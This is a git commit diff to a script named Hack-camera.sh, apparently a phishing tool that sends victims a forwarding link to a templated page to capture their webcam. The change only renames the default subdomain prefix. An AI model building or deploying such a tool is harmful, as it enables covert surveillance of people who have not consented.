7ee0563cf56a22eef4bde9766416b04679575b7a
Mr.X <145559729+Whomrx666@users.noreply.github.com>
2023-09-28 08:35:33 +0700

    Update Hack-camera.sh

--- Hack-camera.sh
+++ Hack-camera.sh
@@ -261,7 +261,7 @@ sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 start() {
 
 default_choose_sub="Y"
-default_subdomain="camdumper$RANDOM"
+default_subdomain="Hack-camera$RANDOM"
 
 printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
 read choose_sub
